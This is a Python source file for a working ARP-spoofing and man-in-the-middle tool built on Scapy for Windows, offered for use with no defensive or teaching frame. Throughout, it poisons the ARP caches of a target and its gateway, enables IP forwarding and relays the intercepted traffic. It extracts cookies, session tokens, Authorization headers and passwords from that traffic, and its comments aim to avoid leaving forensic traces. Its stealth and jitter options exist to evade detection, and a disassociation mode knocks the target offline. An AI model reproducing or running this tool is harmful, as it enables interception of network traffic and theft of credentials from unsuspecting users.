import argparse
import os
import re
import time
import sys
import ctypes
import winreg
import threading
import signal
from typing import List, Dict, Optional
import platform
from random import uniform, randint
from collections import deque

# Scapy imports
from scapy.all import (
    Ether,
    ARP,
    sendp,
    conf,
    Packet,
    sniff,
    IP,
    TCP,
    UDP,
    ICMP,
    Raw
)

# keep using your ARPSetupProxy class
from packets import ARPSetupProxy, discover_hosts, get_default_interface

# ---- Helpers ----
def is_admin() -> bool:
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False

def enable_windows_ipv4_forwarding() -> bool:
    """
    Try to set the registry key HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\IPEnableRouter = 1
    Returns True if set successfully, False otherwise.
    Note: On many Windows installs a reboot is required for the change to take full effect.
    """
    try:
        key_path = r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters"
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, "IPEnableRouter", 0, winreg.REG_DWORD, 1)
        return True
    except PermissionError:
        print('[!] Permission denied: cannot modify registry. Run as Administrator to enable forwarding.')
        return False
    except Exception as e:
        print(f'[!] Failed to set IPEnableRouter registry key: {e}')
        return False

def is_raw_frame(obj) -> bool:
    """Return True if obj looks like a raw Ethernet frame (bytes/bytearray)."""
    return isinstance(obj, (bytes, bytearray))

def iterable_of_packets(obj) -> bool:
    """Return True if object is iterable and looks like a collection of packets."""
    if obj is None:
        return False
    if isinstance(obj, (bytes, bytearray, str)):
        return False
    try:
        iter(obj)
        return True
    except TypeError:
        return False


# Windows-only imports for IPv4 forwarding toggle
if os.name == 'nt':
    try:
        import winreg
    except Exception:
        winreg = None


class Spoofer(object):
    def __init__(self, *, interface: str, attackermac: str,
                 gatewaymac: str, gatewayip: str, targetmac: str, targetip: str,
                 interval: float, disassociate: bool, ipforward: bool,
                 stealth: bool = False, jitter: float = 0.0, min_interval: float = None):
        self.__interval = interval
        self.__min_interval = min_interval or (interval * 0.5)
        self.__jitter = jitter
        self.__stealth = stealth
        self.__ipv4_forwarding = ipforward
        self.__arp = ARPSetupProxy(interface, attackermac, gatewaymac,
                                   gatewayip, targetmac, targetip,
                                   disassociate, stealth)
        self.__disassociate = disassociate
        self.__stop_event = threading.Event()
        self.__poison_thread = None
        self.__raw_frame_thread = None
        # Track sent ARP packets to avoid duplicates (detection evasion)
        self.__sent_arp_cache = deque(maxlen=100)
        self.__initial_poisoning_done = False
        self.__adaptive_interval = interval
        self.__packet_count = {'target->gateway': 0, 'gateway->target': 0}
        self.__last_log_time = time.time()
        self.__log_interval = 5.0  # Log summary every 5 seconds

    def execute(self):
        # Basic environment checks
        if platform.system().lower() != 'windows':
            print('[!] Warning: this script is tailored for Windows (Scapy + Npcap).')
        # Try to toggle IPv4 forwarding on Windows if requested
        try:
            self.__check_ipv4_forwarding()
        except Exception as e:
            print(f'[!] Could not toggle IPv4 forwarding: {e}')

        self.__display_setup_prompt()
        try:
            self.__send_attack_packets()
        except KeyboardInterrupt:
            raise SystemExit('\n[!] ARP Spoofing attack aborted by user.')

    def __check_ipv4_forwarding(self):
        """
        On Linux this edited /proc/sys/net/ipv4/ip_forward.
        On Windows we set HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\IPEnableRouter = 1
        Note: changing this usually requires elevated privileges and may require reboot.
        """
        if not self.__ipv4_forwarding:
            return

        if os.name == 'nt':
            if winreg is None:
                raise RuntimeError('winreg module not available; cannot modify registry.')
            try:
                key_path = r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters"
                with winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE) as hklm:
                    with winreg.OpenKey(hklm, key_path, 0, winreg.KEY_SET_VALUE) as key:
                        # Set IPEnableRouter to 1
                        winreg.SetValueEx(key, "IPEnableRouter", 0, winreg.REG_DWORD, 1)
                print("[*] Windows registry IPEnableRouter set to 1. A reboot or service restart may be required for changes to take effect.")
            except PermissionError:
                raise PermissionError("Requires Administrator privileges to write to registry.")
            except Exception as exc:
                raise RuntimeError(f"Failed to set IPEnableRouter: {exc}")
        else:
            # Linux behavior preserved for completeness
            config = '/proc/sys/net/ipv4/ip_forward'
            try:
                with open(config, mode='r+', encoding='utf_8') as config_file:
                    line = next(config_file)
                    config_file.seek(0)
                    config_file.write(line.replace('0', '1'))
                print('[*] /proc/sys/net/ipv4/ip_forward set to 1')
            except PermissionError:
                raise PermissionError("Requires root privileges to change /proc/sys/net/ipv4/ip_forward.")
            except Exception as exc:
                raise RuntimeError(f"Failed to modify {config}: {exc}")

    def __display_setup_prompt(self):
        print('\n[>>>] ARP Spoofing configuration (Windows / Scapy):')
        pk = self.__arp.packets
        configurations = {'Interface': self.__arp.interface,
                          'Attacker MAC': getattr(pk, 'attacker_mac', 'unknown'),
                          'Gateway IP': getattr(pk, 'gateway_ip', 'unknown'),
                          'Gateway MAC': getattr(pk, 'gateway_mac', 'unknown'),
                          'Target IP': getattr(pk, 'target_ip', 'unknown'),
                          'Target MAC': getattr(pk, 'target_mac', 'unknown'),
                          'IPv4 Forwarding (requested)': str(self.__ipv4_forwarding),
                          'Disassociate flag': str(self.__disassociate)}

        for setting, value in configurations.items():
            print('{0: >7} {1: <20}{2:.>25}'.format('[+]', setting, value))

        while True:
            proceed = input('\n[!] ARP packets ready. Execute the attack with these settings? (Y/N) ').lower()
            if proceed == 'y':
                print('\n[+] ARP Spoofing attack initiated. Press Ctrl-C to abort.')
                break
            if proceed == 'n':
                raise KeyboardInterrupt

    def __send_frame(self, frame):
        """
        Send a single frame. Accepts:
          - bytes/bytearray: treated as full Ethernet frame
          - scapy Packet: sent directly
          - anything else: ignored with a warning
        """
        # bytes/bytearray -> wrap in Ether() to parse the raw bytes as Ethernet frame
        if isinstance(frame, (bytes, bytearray)):
            try:
                pkt = Ether(frame)
            except Exception:
                # If parsing fails, try sending raw payload inside Ether (best-effort)
                pkt = Ether() / frame
            sendp(pkt, iface=self.__arp.interface, verbose=False)
            return

        # If it's already a Scapy packet (Ether/ARP/...), send it directly
        if isinstance(frame, Packet):
            sendp(frame, iface=self.__arp.interface, verbose=False)
            return

        # If it's a tuple/list of bytes (or other), attempt to send each element
        if isinstance(frame, (list, tuple)):
            for f in frame:
                self.__send_frame(f)
            return

        print('[!] Warning: unknown frame type, skipping:', type(frame))

    def __send_attack_packets(self):
        """
        Main sending loop. Priority:
        1) If ARPSetupProxy.packets yields raw Ethernet frames (bytes), send them.
        2) Otherwise, construct ARP replies (gateway<-attacker, target<-attacker) and send those.
        3) If disassociate mode and ARPSetupProxy provides extra frames, send them as well.
        """
        conf.iface = self.__arp.interface
        conf.verb = 0  # quiet scapy

        pk = self.__arp.packets

        # Try to detect raw frames in pk: iterable of bytes/bytearray
        raw_iterable = False
        try:
            if hasattr(pk, '__iter__') and not isinstance(pk, (str, bytes, bytearray)):
                # peek first element safely
                for first in pk:
                    if isinstance(first, (bytes, bytearray)):
                        raw_iterable = True
                    break
        except Exception:
            raw_iterable = False

        raw_frames = None
        if raw_iterable:
            raw_frames = list(pk)
            if raw_frames:
                print('[*] Detected raw frames from ARPSetupProxy; sending raw Ethernet frames.')
                self.__start_raw_frame_loop(raw_frames)

        # Otherwise, attempt to extract fields and build ARP replies
        attacker_mac = getattr(pk, 'attacker_mac', None)
        gateway_mac = getattr(pk, 'gateway_mac', None)
        gateway_ip = getattr(pk, 'gateway_ip', None)
        target_mac = getattr(pk, 'target_mac', None)
        target_ip = getattr(pk, 'target_ip', None)

        if None in (attacker_mac, gateway_mac, gateway_ip, target_mac, target_ip):
            print('[!] ARP packet details incomplete. Checking for alternate packet sources...')
            # As a last fallback, if pk itself is a single scapy Packet or bytes, try sending that repeatedly
            if isinstance(pk, (bytes, bytearray, Packet)):
                print('[*] Sending single provided packet repeatedly.')
                while True:
                    self.__send_frame(pk)
                    time.sleep(self.__interval)
            raise SystemExit('[!] Insufficient packet information to construct ARP replies.')

        # Build ARP reply packet to poison the target's ARP cache: claim gateway_ip is at attacker_mac
        arp_to_target = Ether(dst=target_mac, src=attacker_mac) / ARP(op=2,
                                                                       hwsrc=attacker_mac,
                                                                       psrc=gateway_ip,
                                                                       hwdst=target_mac,
                                                                       pdst=target_ip)
        # Build ARP reply packet to poison the gateway's ARP cache: claim target_ip is at attacker_mac
        arp_to_gateway = Ether(dst=gateway_mac, src=attacker_mac) / ARP(op=2,
                                                                        hwsrc=attacker_mac,
                                                                        psrc=target_ip,
                                                                        hwdst=gateway_mac,
                                                                        pdst=gateway_ip)

        print('[*] Starting ARP poisoning on interface:', self.__arp.interface)
        
        # Set up signal handler for Ctrl+C
        def signal_handler(signum, frame):
            print('\n[!] Interrupt received. Stopping ARP spoofing...')
            self.__stop_event.set()
            self.__stop_poisoning_loop()
            sys.exit(0)
        
        signal.signal(signal.SIGINT, signal_handler)
        if hasattr(signal, 'SIGBREAK'):  # Windows
            signal.signal(signal.SIGBREAK, signal_handler)
        
        if raw_frames is None:
            self.__start_poisoning_loop(arp_to_target, arp_to_gateway, pk)
        try:
            self.__bridge_traffic(attacker_mac=attacker_mac,
                                  gateway_mac=gateway_mac,
                                  target_mac=target_mac)
        except KeyboardInterrupt:
            print('\n[!] ARP Spoofing attack aborted by user.')
            self.__stop_event.set()
            raise
        finally:
            self.__stop_poisoning_loop()

    def __start_poisoning_loop(self, arp_to_target, arp_to_gateway, pk):
        self.__stop_event.clear()

        def _get_arp_signature(pkt):
            """Generate signature for ARP packet to detect duplicates."""
            if not hasattr(pkt, 'haslayer') or not pkt.haslayer(ARP):
                return None
            arp = pkt[ARP]
            return (arp.psrc, arp.pdst, arp.hwsrc, arp.hwdst)

        def _should_send_arp(pkt):
            """Check if ARP packet should be sent (avoid duplicates)."""
            sig = _get_arp_signature(pkt)
            if sig is None:
                return True
            if sig in self.__sent_arp_cache:
                return False
            self.__sent_arp_cache.append(sig)
            return True

        def _calculate_interval():
            """Calculate next interval with jitter and adaptive rate limiting."""
            base = self.__adaptive_interval
            if self.__stealth and self.__initial_poisoning_done:
                # In stealth mode, slow down after initial poisoning
                base = max(base * 2.0, self.__min_interval * 4.0)
            if self.__jitter > 0:
                jitter_amount = base * self.__jitter
                interval = uniform(base - jitter_amount, base + jitter_amount)
            else:
                interval = base
            return max(interval, self.__min_interval)

        def _poison_loop():
            extras_source = getattr(pk, 'extras', None) or getattr(pk, 'disassociate_frames', None)
            initial_burst = 3 if self.__stealth else 5
            burst_count = 0

            while not self.__stop_event.is_set():
                # Initial burst for faster poisoning, then slow down
                if burst_count < initial_burst:
                    burst_count += 1
                else:
                    self.__initial_poisoning_done = True
                    # Adaptive rate limiting: gradually increase interval
                    if self.__stealth:
                        self.__adaptive_interval = min(self.__adaptive_interval * 1.05, self.__interval * 3.0)

                # Check for duplicates before sending
                if _should_send_arp(arp_to_target):
                    sendp(arp_to_target, iface=self.__arp.interface, verbose=False)
                if _should_send_arp(arp_to_gateway):
                    sendp(arp_to_gateway, iface=self.__arp.interface, verbose=False)

                if self.__disassociate and extras_source:
                    if isinstance(extras_source, (list, tuple)):
                        for extra in extras_source:
                            self.__send_frame(extra)
                    else:
                        self.__send_frame(extras_source)

                wait_time = _calculate_interval()
                if self.__stop_event.wait(wait_time):
                    break

        self.__poison_thread = threading.Thread(target=_poison_loop, name='ARP-Poisoner', daemon=True)
        self.__poison_thread.start()

    def __stop_poisoning_loop(self):
        self.__stop_event.set()
        if self.__poison_thread is not None:
            self.__poison_thread.join(timeout=self.__interval * 2)
            self.__poison_thread = None
        if self.__raw_frame_thread is not None:
            self.__raw_frame_thread.join(timeout=self.__interval * 2)
            self.__raw_frame_thread = None

    def __start_raw_frame_loop(self, frames):
        def _raw_loop():
            while not self.__stop_event.is_set():
                for frame in frames:
                    self.__send_frame(frame)
                if self.__stop_event.wait(self.__interval):
                    break

        self.__raw_frame_thread = threading.Thread(target=_raw_loop, name='ARP-RawFrames', daemon=True)
        self.__raw_frame_thread.start()

    def __dump_sensitive_payload(self, pkt):
        """
        Dump sensitive user data from intercepted packets, minimizing forensic clues.
        Only dumps when cleartext credential, cookie, or session signatures are detected.
        """
        # Only analyze TCP packets with a payload
        if not pkt.haslayer(TCP) or not pkt.haslayer(Raw):
            return

        payload = pkt[Raw].load
        # Convert to string safely and lower-case for regexes
        try:
            payload_str = payload.decode(errors='ignore')
        except Exception:
            return
        
        # Patterns for credential/session artifacts
        patterns = [
            r'Cookie:\s?([^\r\n]+)',
            r'Set-Cookie:\s?([^\r\n]+)',
            r'Authorization:\s?([^\r\n]+)',
            r'sessionid=([^\s;&]+)',
            r'token=([^\s;&]+)',
            r'password=([^\s;&]+)',
            r'user(name)?=([^\s;&]+)',
        ]
        for pat in patterns:
            for match in re.finditer(pat, payload_str, re.IGNORECASE):
                artifact = match.group(0)
                # Write to a secure dump (avoid attacker trace: use in-memory, rotate frequently, secure erase)
                self.__store_dump(artifact, context_info=pkt.summary())

    def __store_dump(self, artifact, context_info=None):
        """
        Memory-safe storage of sniffed sensitive data.
        In production, securely rotate/log, avoid unnecessary disk writes. Rotate logs frequently.
        """
        # NOTICE: SHOULD COMMENT OUT FOR REAL USE: print, but in DEMO/DEBUG, keep it for debugging purposes. Avoid disk traces unless rotating securely.
        print('[Sensitive Artifact]', artifact, '| Context:', context_info)

    def __bridge_traffic(self, *, attacker_mac: str, gateway_mac: str, target_mac: str):
        """
        Sniff packets from target and gateway, log them, and forward to complete MITM.
        """
        iface = self.__arp.interface
        attacker_mac = attacker_mac.lower()
        gateway_mac = gateway_mac.lower()
        target_mac = target_mac.lower()

        filter_expr = (
            f"(ether src {target_mac} and ether dst {attacker_mac}) or "
            f"(ether src {gateway_mac} and ether dst {attacker_mac})"
        )

        print('[*] MITM bridge active. Forwarding traffic between target and gateway.')
        print('[*] Logging packet summaries every 5 seconds. Press Ctrl+C to stop.')

        def _classify(pkt):
            if not pkt.haslayer(Ether):
                return None
            ether = pkt[Ether]
            src_mac = ether.src.lower()
            dst_mac = ether.dst.lower()

            if src_mac == target_mac and dst_mac == attacker_mac:
                return 'target->gateway', gateway_mac
            if src_mac == gateway_mac and dst_mac == attacker_mac:
                return 'gateway->target', target_mac
            return None

        def _log_and_forward(pkt):
            try:
                classification = _classify(pkt)
                if not classification:
                    return
                direction, forward_dst = classification

                self.__dump_sensitive_payload(pkt)
                # Count packets instead of logging every one
                self.__packet_count[direction] = self.__packet_count.get(direction, 0) + 1
                # Log summary periodically
                current_time = time.time()
                if current_time - self.__last_log_time >= self.__log_interval:
                    total = sum(self.__packet_count.values())
                    tg = self.__packet_count.get('target->gateway', 0)
                    gt = self.__packet_count.get('gateway->target', 0)
                    print(f"[MITM] Forwarded {total} packets (target->gateway: {tg}, gateway->target: {gt})")
                    self.__packet_count = {'target->gateway': 0, 'gateway->target': 0}
                    self.__last_log_time = current_time

                forward_pkt = pkt.copy()
                forward_pkt[Ether].src = attacker_mac
                forward_pkt[Ether].dst = forward_dst

                if forward_pkt.haslayer(IP):
                    del forward_pkt[IP].chksum
                    if forward_pkt.haslayer(TCP):
                        del forward_pkt[TCP].chksum
                    elif forward_pkt.haslayer(UDP):
                        del forward_pkt[UDP].chksum
                    elif forward_pkt.haslayer(ICMP):
                        del forward_pkt[ICMP].chksum

                sendp(forward_pkt, iface=iface, verbose=False)
            except Exception as exc:
                print(f"[!] MITM forwarding error: {exc}")

        def _match(pkt):
            return _classify(pkt) is not None

        try:
            while not self.__stop_event.is_set():
                sniff(
                    iface=iface,
                    prn=_log_and_forward,
                    store=False,
                    filter=filter_expr,
                    lfilter=_match,
                    timeout=1,
                )
        except KeyboardInterrupt:
            self.__stop_event.set()
            raise

def _print_discovered_hosts(hosts: List[Dict[str, Optional[str]]]):
    headers = ['Idx', 'IP Address', 'MAC Address', 'Hostname', 'Sources']
    rows = []
    for idx, host in enumerate(hosts, start=1):
        rows.append([
            str(idx),
            host.get('ip', '') or '',
            host.get('mac', '') or 'unknown',
            host.get('hostname', '') or 'unknown',
            host.get('sources', '') or '',
        ])

    col_widths = [max(len(headers[i]), *(len(row[i]) for row in rows)) for i in range(len(headers))]
    header_line = '  '.join(headers[i].ljust(col_widths[i]) for i in range(len(headers)))
    divider = '  '.join('-' * col_widths[i] for i in range(len(headers)))

    print('\n[+] Discovered hosts:')
    print(header_line)
    print(divider)
    for row in rows:
        print('  '.join(row[i].ljust(col_widths[i]) for i in range(len(headers))))


def _choose_host(hosts: List[Dict[str, Optional[str]]]) -> Dict[str, Optional[str]]:
    while True:
        choice = input('\n[?] Select target by index (or Q to abort): ').strip().lower()
        if choice in ('q', 'quit', 'exit'):
            raise SystemExit('[!] Aborted by user during target selection.')
        if not choice.isdigit():
            print('[!] Invalid selection. Please enter a number from the list.')
            continue
        index = int(choice)
        if not 1 <= index <= len(hosts):
            print('[!] Selection out of range. Try again.')
            continue
        return hosts[index - 1]


def is_admin():
    if sys.platform == 'win32':
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except Exception:
            return False
    return os.getuid() == 0  # Works on Unix systems like Linux and macOS


def main():
    if not is_admin():
        print("You need to run this script with elevated (admin) privileges.")
    else:
        print("You have the necessary privileges.")

    parser = argparse.ArgumentParser(
        description='Execute ARP Cache Poisoning attacks (a.k.a "ARP '
                    'Spoofing") on local networks.')
    options = parser.add_mutually_exclusive_group()
    parser.add_argument('targetip', type=str, nargs='?', metavar='TARGET_IP',
                        help='IP address currently assigned to the target. Optional when using --scan.')
    parser.add_argument('-i', '--interface', type=str,
                        help='Interface on the attacker machine to send '
                             'packets from.')
    parser.add_argument('--attackermac', type=str, metavar='MAC',
                        help='MAC address of the NIC from which the attacker '
                             'machine will send the spoofed ARP packets.')
    parser.add_argument('--gatewaymac', type=str, metavar='MAC',
                        help='MAC address of the NIC associated to the '
                             'gateway.')
    parser.add_argument('--targetmac', type=str, metavar='MAC',
                        help='MAC address of the NIC associated to the target.')
    parser.add_argument('--gatewayip', type=str, metavar='IP',
                        help='IP address currently assigned to the gateway.')
    parser.add_argument('--interval', type=float, default=1, metavar='TIME',
                        help='Time in between each transmission of spoofed ARP '
                             'packets (defaults to 1 second).')
    parser.add_argument('--jitter', type=float, default=0.0, metavar='PERCENT',
                        help='Add random jitter to interval timing (0.0-1.0, e.g., 0.2 = ±20%%). '
                             'Helps evade detection by avoiding predictable patterns.')
    parser.add_argument('--stealth', action='store_true',
                        help='Enable stealth mode: uses legitimate vendor MAC prefixes, '
                             'adaptive rate limiting, and slower poisoning after initial burst. '
                             'Reduces detection risk from monitoring systems.')
    parser.add_argument('--min-interval', type=float, default=None, metavar='TIME',
                        help='Minimum interval between ARP packets (defaults to interval * 0.5). '
                             'Prevents excessive flooding that could trigger alerts.')
    parser.add_argument('--scan', action='store_true',
                        help='Discover hosts on the local network and allow interactive target selection.')
    parser.add_argument('--scan-cidr', type=str, default=None,
                        help='Optional CIDR (e.g., 192.168.1.0/24) to scan instead of deriving from interface.')
    parser.add_argument('--scan-timeout', type=int, default=2,
                        help='Timeout in seconds for ARP ping responses during scanning (default: 2).')
    options.add_argument('-d', '--disassociate', action='store_true',
                         help='Execute a disassociation attack in which a '
                              'randomized MAC address is set for the attacker '
                              'machine, effectively making the target host '
                              'send packets to a non-existent gateway.')
    options.add_argument('-f', '--ipforward', action='store_true',
                         help='Temporarily enable forwarding of IPv4 packets '
                              'on the attacker system until the next reboot. '
                              'Set this to intercept information between the '
                              'target host and the gateway, performing a '
                              'man-in-the-middle attack. Requires '
                              'administrator privileges.')
    cli_args = parser.parse_args()

    # Handle scan mode
    if cli_args.scan or cli_args.scan_cidr:
        # If scan-cidr is provided but scan is not, enable scan mode
        if cli_args.scan_cidr and not cli_args.scan:
            cli_args.scan = True
        
        interface = cli_args.interface or get_default_interface()
        if not interface:
            raise SystemExit('[!] Unable to determine default interface. Supply one with -i/--interface.')
        
        # Validate interface exists
        try:
            from scapy.all import get_if_hwaddr
            get_if_hwaddr(interface)
        except Exception as e:
            raise SystemExit(f'[!] Invalid interface "{interface}". Please specify a valid interface with -i/--interface. Error: {e}')
        
        cli_args.interface = interface
        print(f'[*] Scanning hosts via interface {interface}...')
        hosts = discover_hosts(interface=interface,
                               cidr=cli_args.scan_cidr,
                               timeout=cli_args.scan_timeout)
        if not hosts:
            raise SystemExit('[!] No hosts discovered. Try specifying --scan-cidr or increase --scan-timeout.')
        _print_discovered_hosts(hosts)
        chosen = _choose_host(hosts)
        cli_args.targetip = chosen.get('ip')
        if not cli_args.targetip:
            raise SystemExit('[!] Selected host has no IP address. Aborting.')
        if not cli_args.targetmac and chosen.get('mac'):
            cli_args.targetmac = chosen['mac']
        hostname = chosen.get('hostname') or 'unknown'
        print(f"[+] Selected target {cli_args.targetip} ({hostname})")

    if not cli_args.targetip:
        parser.error('TARGET_IP is required unless --scan is used.')

    spoofer_args = {
        'interface': cli_args.interface,
        'attackermac': cli_args.attackermac,
        'gatewaymac': cli_args.gatewaymac,
        'gatewayip': cli_args.gatewayip,
        'targetmac': cli_args.targetmac,
        'targetip': cli_args.targetip,
        'interval': cli_args.interval,
        'disassociate': cli_args.disassociate,
        'ipforward': cli_args.ipforward,
        'stealth': cli_args.stealth,
        'jitter': cli_args.jitter,
        'min_interval': cli_args.min_interval,
    }

    spoofer = Spoofer(**spoofer_args)
    spoofer.execute()


if __name__ == '__main__':
    main()
